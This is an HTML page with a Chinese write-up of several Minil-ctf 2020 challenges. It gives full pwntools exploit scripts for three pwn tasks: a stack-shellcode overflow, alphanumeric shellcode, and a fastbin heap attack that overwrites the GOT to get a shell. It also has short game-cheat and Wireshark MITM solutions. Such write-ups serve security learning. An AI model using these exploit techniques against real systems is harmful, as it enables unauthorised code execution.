<!DOCTYPE html> <html lang="zh"> <head> <meta charset="utf-8"/> <title>Markdown在线编辑器 - www.MdEditor.com</title> <link rel="shortcut icon" href="https://www.mdeditor.com/images/logos/favicon.ico" type="image/x-icon"/> </head> <body><h1 id="h1-minil-ctf-2020-writeup"><a name="Minil-ctf 2020 部分题目WriteUp" class="reference-link"></a><span class="header-link octicon octicon-link"></span>Minil-ctf 2020 部分题目WriteUp</h1><hr> <p>team:枣子姐永远滴神<br>members: </p><pre class="prettyprint linenums prettyprinted" style=""><ol class="linenums"><li class="L0"><code><span class="pun">-</span><span class="pln"> u7chi</span></code></li><li class="L1"><code><span class="pun">-</span><span class="pln"> </span><span class="typ">Tian</span></code></li><li class="L2"><code><span class="pun">-</span><span class="pln"> </span><span class="pun">讲不了道理哇</span><span class="pln">_</span></code></li></ol></pre><hr> <h2 id="h2-u76EEu5F55"><a name="目录" class="reference-link"></a><span class="header-link octicon octicon-link"></span>目录</h2><ul> <li>0x1 PWN<ul> <li>0x11 hello</li><li>0x12 ezsc</li><li>0x13 noleak</li></ul> </li><li>0x2 MISC<ul> <li>0x21 MiniGameHacking</li><li>0x22 MITM1 and MITM2</li></ul> </li><li>0X3 Android<ul> <li>0x31 Testonly?</li><li>0x32 Khronos</li></ul> </li><li>0x4 Reverse<ul> <li>0x41 Easyre</li></ul> </li></ul> <h2 id="h2-0x1-pwn"><a name="0x1 PWN" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x1 PWN</h2><h3 id="h3-0x11-hello"><a name="0x11 hello" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x11 hello</h3><p>先查看一下程序开启了哪些保护，发现啥都没开。<br><img src="https://wx2.sbimg.cn/2020/05/17/1c0461c86de74fe17.png" alt="1c0461c86de74fe17.png"> </p><p>再来看看IDA逆向的源码，下图所示函数中存在漏洞，读入了过量的字符<br><img src="<img src="https://wx1.sbimg.cn/2020/05/17/12.png" alt="12" border="0">" alt="12.png"><br>但是由于读入数据长度受限，我们最多能再覆盖一个rbp和一个ret加一个ret下面的栈帧。无法构造较长的RoP链。在看到NX disabled后，就考虑将shellcode布置到栈上，利用跳转到ret下面的栈帧做跳板（该栈帧我们可以任意控制，因而可以写入代码sub rsp, 0x40;jmp rsp)来跳转到shellcode处。 </p><p>具体exp如下：</p> <pre class="prettyprint linenums prettyprinted" style=""><ol class="linenums"><li class="L0"><code><span class="com">#encoding:utf-8</span></code></li><li class="L1"><code><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L2"><code></code></li><li class="L3"><code><span class="pln">context</span><span class="pun">(</span><span class="pln">arch</span><span class="pun">=</span><span class="str">'amd64'</span><span class="pun">,</span><span class="pln"> os</span><span class="pun">=</span><span class="str">'linux'</span><span class="pun">,</span><span class="pln"> log_level</span><span class="pun">=</span><span class="str">'debug'</span><span class="pun">)</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="pln">sh </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="str">'pwn.challenge.mini.lctf.online'</span><span class="pun">,</span><span class="pln"> </span><span class="lit">10043</span><span class="pun">)</span></code></li><li class="L6"><code></code></li><li class="L7"><code></code></li><li class="L8"><code><span class="pln">jmp_rsp </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x4006ca</span><span class="pln"> </span><span class="com">#用Ropgadget得到跳转到栈上执行代码的指令的地址</span></code></li><li class="L9"><code><span class="pln">sub_rsp_jmp </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">asm</span><span class="pun">(</span><span class="str">'sub rsp, 0x40;jmp rsp'</span><span class="pun">)</span></code></li><li class="L0"><code><span class="pln">shellcode </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">asm</span><span class="pun">(</span><span class="pln">shellcraft</span><span class="pun">.</span><span class="pln">sh</span><span class="pun">())</span></code></li><li class="L1"><code><span class="kwd">print</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">shellcode</span><span class="pun">)</span><span class="pln"> </span><span class="com">#这里打印一下shellcode的长度，看之后需要补几个'a'</span></code></li><li class="L2"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'name?\n'</span><span class="pun">)</span></code></li><li class="L3"><code><span class="pln">shell </span><span class="pun">=</span><span class="pln">shellcode </span><span class="pun">+</span><span class="pln"> </span><span class="str">'a'</span><span class="pun">*</span><span class="lit">0x8</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">jmp_rsp</span><span class="pun">)+</span><span class="pln">sub_rsp_jmp</span></code></li><li class="L4"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">sendline</span><span class="pun">(</span><span class="pln">shell</span><span class="pun">)</span></code></li><li class="L5"><code></code></li><li class="L6"><code></code></li><li class="L7"><code></code></li><li class="L8"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><h3 id="h3-0x12-ezsc"><a name="0x12 ezsc" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x12 ezsc</h3><p>同样的，查看一下程序开启的保护,没法修改got表，不能在栈上运行代码，有canary。<br><img src="https://wx2.sbimg.cn/2020/05/17/13c2b1a7a113bac997.png" alt="13c2b1a7a113bac997.png"><br>在IDA中打开，功能实现都在main函数中：<br><img src="https://wx2.sbimg.cn/2020/05/17/14.png" alt="14.png"><br>注意到第31行v8(xxx,xxx)将v8当作一个函数调用，汇编代码就是将两个参数入栈，再jmp到v8这个指针所指向的地址。往上看，发现我们可以控制v8指向地址的数据，那么输入一个shellcode就能获取shell了。关键在于这个if(!isalnum)的绕过。因此，我们需要发送的shellcode只能包含字母和数字。<br>一开始查找工具的时候，发现github上的一个工具shellcode_encoder。但是这个工具生成的shellcode的字符范围是包含所有可打印字符的，不符合要求。第二天的时候，又找到一个工具ALPHA3<br>具体使用方式见该<a href="http://https://www.jianshu.com/p/8ae8c055e35c">博客</a><br>利用python ./ALPHA3.py x64 ascii mixedcase rax —input=”shellcode.bin” &gt;<br>out.bin将我们之前生成的普通x64shellcode.bin做转换，得到纯字母数字的shellcode。接下来简单的进行发送就好了。<br>具体exp如下： </p><pre class="prettyprint linenums prettyprinted" style=""><ol class="linenums"><li class="L0"><code><span class="com">#encoding:utf-8</span></code></li><li class="L1"><code><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L2"><code></code></li><li class="L3"><code><span class="pln">context</span><span class="pun">(</span><span class="pln">arch</span><span class="pun">=</span><span class="str">'amd64'</span><span class="pun">,</span><span class="pln"> os</span><span class="pun">=</span><span class="str">'linux'</span><span class="pun">,</span><span class="pln"> log_level</span><span class="pun">=</span><span class="str">'debug'</span><span class="pun">)</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="pln">shellcode </span><span class="pun">=</span><span class="pln"> </span><span class="kwd">asm</span><span class="pun">(</span><span class="pln">shellcraft</span><span class="pun">.</span><span class="pln">sh</span><span class="pun">())</span><span class="pln"> </span><span class="com">#构造目标主机的shellcode</span></code></li><li class="L6"><code></code></li><li class="L7"><code><span class="pln">fd </span><span class="pun">=</span><span class="pln"> open</span><span class="pun">(</span><span class="str">'shellcode.bin'</span><span class="pun">,</span><span class="str">'wb'</span><span class="pun">)</span></code></li><li class="L8"><code><span class="pln">fd</span><span class="pun">.</span><span class="pln">write</span><span class="pun">(</span><span class="pln">shellcode</span><span class="pun">)</span></code></li><li class="L9"><code></code></li><li class="L0"><code><span class="pln">pause</span><span class="pun">()</span></code></li><li class="L1"><code></code></li><li class="L2"><code><span class="pln">sh </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="str">'pwn.challenge.mini.lctf.online'</span><span class="pun">,</span><span class="pln"> </span><span class="lit">10010</span><span class="pun">)</span></code></li><li class="L3"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'&gt; '</span><span class="pun">)</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="pln">alpha_shellcode </span><span class="pun">=</span><span class="pln"> </span><span class="str">"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"</span><span class="pln"> </span><span class="com">#将alpha3转换后的shellcode复制到这里</span></code></li><li class="L6"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">send</span><span class="pun">(</span><span class="pln">alpha_shellcode</span><span class="pun">)</span></code></li><li class="L7"><code></code></li><li class="L8"><code></code></li><li class="L9"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><h3 id="h3-0x13-noleak"><a name="0x13 noleak" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x13 noleak</h3><p>一道堆的题。可以改写got表。程序大概就是一个根据用户指定的输入长度来获取数据，最多保存10条数据。在0x6020C0处有一个char ptr[80]，可以看作是一个指针数组char* ptr[10]。每一条数据都保存相应指针所指向的堆中。<br>具体功能：1.create(size,content) 依据输入的大小，获取content，中途遇到回车会停止<br>2.edit(index,size,content)依据输入的大小，获取content，改写索引为index的数据，当size大于原来的size时，以原来的size为准<br>3.delete(index) 删除索引为index的数据，并将指针指向0<br>这个程序对输入都有比较严格的判断，看了源码蛮久的，才发现漏洞出在edit中，具体代码如下：<br><img src="https://wx2.sbimg.cn/2020/05/17/15.png" alt="15.png"><br>这里数据长度的检测是通过strlen()实现的。当我们利用chunk的空间复用，在创建第一个chunk时填满整个堆的空间，再紧接着创建第二个chunk，这时候我们使用strlen返回的长度会是原来的长度+1。示意图如下：<br>0x0000000000000000 0x0000000000000021 #chunk0 (malloc申请size=24)<br>0x6161616161616161 0x6161616161616161<br>0x6161616161616161 0x0000000000000021 #chunk1<br>0x0000000000000062 0x0000000000000000<br>虽然我们申请的空间大小为24，但是通过strlen获取的长度为25（包含了一个字节的chunk1的块大小）<br>通过这个漏洞，我们可以改写chunk1的块大小，进而进行进一步的攻击。大致思路就是先申请三块chunk,通过chunk0更改chunk1的大小，更改后的chunk_size = chunk1_size+chunk2_size<br>然后将chunk1和chunk2都free掉，他们会进入fastbins(大概？)接下来再申请一个和chunk_size相同大小的块,我们就可以利用这个chunk来控制在fastbins中的chunk2的fd域，使得我们之后申请的块的地址可控。fastbins中的块需要通过大小的检测，所以我们需要找到合适的地址作为目标块。鉴于我们可以修改prt[0]的指向进而通过edit(0,8,content)修改got表,所以我们在ptr[0]的上方寻找合适的块。<br>可以找到0x6020b0+5处数据为0x000000000000007f符合一个chunk头的格式，且表示的chunk大小为0x70<br>根据这个我们可以反推出之前我们需要申请的块的大小。 </p><p>具体exp如下：</p> <pre class="prettyprint linenums prettyprinted" style=""><ol class="linenums"><li class="L0"><code><span class="com">#coding:utf8</span></code></li><li class="L1"><code><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L2"><code></code></li><li class="L3"><code><span class="pln">context</span><span class="pun">.</span><span class="pln">log_level </span><span class="pun">=</span><span class="pln"> </span><span class="str">'debug'</span></code></li><li class="L4"><code><span class="pln">context</span><span class="pun">.</span><span class="pln">terminal </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="str">'tmux'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'splitw'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'-h'</span><span class="pun">]</span></code></li><li class="L5"><code><span class="pln">sh </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="str">'pwn.challenge.mini.lctf.online'</span><span class="pun">,</span><span class="pln"> </span><span class="lit">10072</span><span class="pun">)</span></code></li><li class="L6"><code><span class="com">#sh=process('./time_management')</span></code></li><li class="L7"><code><span class="com">#addr="0x40099B"</span></code></li><li class="L8"><code><span class="com">#gdb.attach(sh, "b *" + addr) ##tmux</span></code></li><li class="L9"><code><span class="com">#pause()</span></code></li><li class="L0"><code><span class="kwd">def</span><span class="pln"> create</span><span class="pun">(</span><span class="pln">size</span><span class="pun">,</span><span class="pln">content</span><span class="pun">):</span></code></li><li class="L1"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">'ce : '</span><span class="pun">,</span><span class="str">'1'</span><span class="pun">)</span></code></li><li class="L2"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">'?\n'</span><span class="pun">,</span><span class="pln">str</span><span class="pun">(</span><span class="pln">size</span><span class="pun">))</span></code></li><li class="L3"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendafter</span><span class="pun">(</span><span class="str">'plan: '</span><span class="pun">,</span><span class="pln">content</span><span class="pun">)</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="kwd">def</span><span class="pln"> </span><span class="kwd">delete</span><span class="pun">(</span><span class="pln">index</span><span class="pun">):</span></code></li><li class="L6"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">'ce : '</span><span class="pun">,</span><span class="str">'3'</span><span class="pun">)</span></code></li><li class="L7"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">'Index : '</span><span class="pun">,</span><span class="pln">str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L8"><code></code></li><li class="L9"><code><span class="kwd">def</span><span class="pln"> edit</span><span class="pun">(</span><span class="pln">index</span><span class="pun">,</span><span class="pln">size</span><span class="pun">,</span><span class="pln">content</span><span class="pun">):</span></code></li><li class="L0"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">'choice : '</span><span class="pun">,</span><span class="str">'2'</span><span class="pun">)</span></code></li><li class="L1"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">'Index : '</span><span class="pun">,</span><span class="pln">str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L2"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">'?\n'</span><span class="pun">,</span><span class="pln">str</span><span class="pun">(</span><span class="pln">size</span><span class="pun">))</span></code></li><li class="L3"><code><span class="pln"> sh</span><span class="pun">.</span><span class="pln">sendafter</span><span class="pun">(</span><span class="str">'plan: '</span><span class="pun">,</span><span class="pln">content</span><span class="pun">)</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="pln">target_addr </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x6020b0</span><span class="pun">+</span><span class="lit">5</span><span class="pun">-</span><span class="lit">8</span></code></li><li class="L6"><code><span class="pln">ptr_0 </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x6020c0</span></code></li><li class="L7"><code><span class="pln">atoi_got </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x602068</span></code></li><li class="L8"><code><span class="pln">bin_sh </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x400C9F</span></code></li><li class="L9"><code><span class="pln">put_got </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x602020</span></code></li><li class="L0"><code><span class="pln">malloc_got </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x602058</span></code></li><li class="L1"><code><span class="pln">malloc_plt </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x400750</span></code></li><li class="L2"><code><span class="pln">jmp2_bin_sh </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x054925ff</span></code></li><li class="L3"><code></code></li><li class="L4"><code><span class="pln">create</span><span class="pun">(</span><span class="lit">40</span><span class="pun">,</span><span class="str">'a'</span><span class="pun">*</span><span class="lit">40</span><span class="pun">)#</span><span class="pln">chunk0</span></code></li><li class="L5"><code><span class="pln">create</span><span class="pun">(</span><span class="lit">16</span><span class="pun">,</span><span class="str">'b\n'</span><span class="pun">)#</span><span class="pln">chunk1</span></code></li><li class="L6"><code><span class="pln">create</span><span class="pun">(</span><span class="lit">96</span><span class="pun">,</span><span class="str">'b\n'</span><span class="pun">)#</span><span class="pln">chunk2</span></code></li><li class="L7"><code></code></li><li class="L8"><code><span class="pln">payload </span><span class="pun">=</span><span class="pln"> </span><span class="str">'a'</span><span class="pun">*</span><span class="lit">40</span><span class="pun">+</span><span class="str">'\x91'</span></code></li><li class="L9"><code><span class="pln">edit</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="lit">41</span><span class="pun">,</span><span class="pln">payload</span><span class="pun">)</span><span class="pln"> </span><span class="com">##利用strlen的特性,写入长度大于malloc(size)的长度,改写chunk1的size为0x90</span></code></li><li class="L0"><code></code></li><li class="L1"><code><span class="kwd">delete</span><span class="pun">(</span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L2"><code><span class="kwd">delete</span><span class="pun">(</span><span class="lit">2</span><span class="pun">)</span></code></li><li class="L3"><code></code></li><li class="L4"><code><span class="pln">payload </span><span class="pun">=</span><span class="pln"> </span><span class="lit">16</span><span class="pun">*</span><span class="str">'a'</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">target_addr</span><span class="pun">)+</span><span class="str">'\n'</span></code></li><li class="L5"><code><span class="pln">create</span><span class="pun">(</span><span class="lit">128</span><span class="pun">,</span><span class="pln">payload</span><span class="pun">)</span><span class="pln"> </span><span class="com">#重新申请chunk1,并借助chunk1将fastbin中的chunk2的fd指针指向目标地址</span></code></li><li class="L6"><code></code></li><li class="L7"><code><span class="pln">create</span><span class="pun">(</span><span class="lit">96</span><span class="pun">,</span><span class="str">'b\n'</span><span class="pun">)#申请</span><span class="pln">fastbin</span><span class="pun">中的</span><span class="pln">chunk2</span></code></li><li class="L8"><code><span class="pln">offset </span><span class="pun">=</span><span class="pln"> ptr_0 </span><span class="pun">-</span><span class="pln"> target_addr</span><span class="pun">-</span><span class="lit">0x10</span></code></li><li class="L9"><code><span class="pln">create</span><span class="pun">(</span><span class="lit">96</span><span class="pun">,</span><span class="str">'a'</span><span class="pun">*</span><span class="pln">offset</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">malloc_got</span><span class="pun">)+</span><span class="str">'\n'</span><span class="pun">)#申请</span><span class="pln">fastbin</span><span class="pun">中的构造好的目标地址的块,通过改写块的内容，将</span><span class="pln">ptr</span><span class="pun">[</span><span class="lit">0</span><span class="pun">]指向</span><span class="pln">mallocgot</span></code></li><li class="L0"><code><span class="pln">edit</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="lit">8</span><span class="pun">,</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">bin_sh</span><span class="pun">))#通过</span><span class="pln">ptr</span><span class="pun">[</span><span class="lit">0</span><span class="pun">]改写</span><span class="pln">mallocgot</span><span class="pun">表,使其调用</span><span class="pln">malloc</span><span class="pun">时会去执行</span><span class="pln">system</span><span class="pun">(</span><span class="str">'/bin/sh'</span><span class="pun">)</span></code></li><li class="L1"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">": "</span><span class="pun">,</span><span class="str">'1'</span><span class="pun">)##不知道为什么会先出现一次</span><span class="pln">invalid</span><span class="pun">,</span></code></li><li class="L2"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">": "</span><span class="pun">,</span><span class="str">'1'</span><span class="pun">)##再次选择选项</span><span class="lit">1</span><span class="pun">，进入第一个功能分支</span></code></li><li class="L3"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="str">"?\n"</span><span class="pun">,</span><span class="str">'1'</span><span class="pun">)#调用</span><span class="pln">malloc</span></code></li><li class="L4"><code></code></li><li class="L5"><code><span class="pln">sh</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><h2 id="h2-0x2-misc"><a name="0x2 MISC" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x2 MISC</h2><h3 id="h3-0x21-minigamehacking"><a name="0x21 MiniGameHacking" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x21 MiniGameHacking</h3><p>看到hint中有个(cheat),考虑到使用cheat engine修改内存。然后，我发现的可以有效修改的就是时停的次数。于是就改了时停的次数硬打了16关还是17关来着。通关后就给了flag。不知道是不是预期内的(´Д`) 。</p> <h3 id="h3-0x22-mimt1-and-mimt2"><a name="0x22 MIMT1 and MIMT2" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x22 MIMT1 and MIMT2</h3><p>把文件拖进wireshark，点统计发现三个MAC地址，依次看看，确定了一个是路由器也就是网关，然后另外两个应该一个是受害人，一个是中间人。<br><img src="https://wx2.sbimg.cn/2020/05/17/21.png" alt="21.png"><br>然后查看一下ip选项卡，发现内网ip就只有两个192.168.1.152 和192.168.1.151，其他的ip都是用户请求的服务的ip。所以就尝试一下这两个答案，结果就出来了。<br>根据第一步的flag,确定了中间人是192.168.1.152后，我们就知道受害人为192.168.1.151<br>中间人伪造的CA数据包发送的目的地址肯定也是192.168.1.151<br>因此以服务地址=xxx.xxx.xxx.xxx和目的地址=192.168.1.151进行过滤，查看发送服务器向用户发送的CA证书。多找几个，就能发现一个比较奇怪的issuer common name 被不同的服务器公用，还是用SHA1签名的。于是提交上去就完成了。 </p><h2 id="h2-0x3-android"><a name="0x3 Android" class="reference-link"></a><span class="header-link octicon octicon-link"></span>0x3 Android</h2></body> </html>
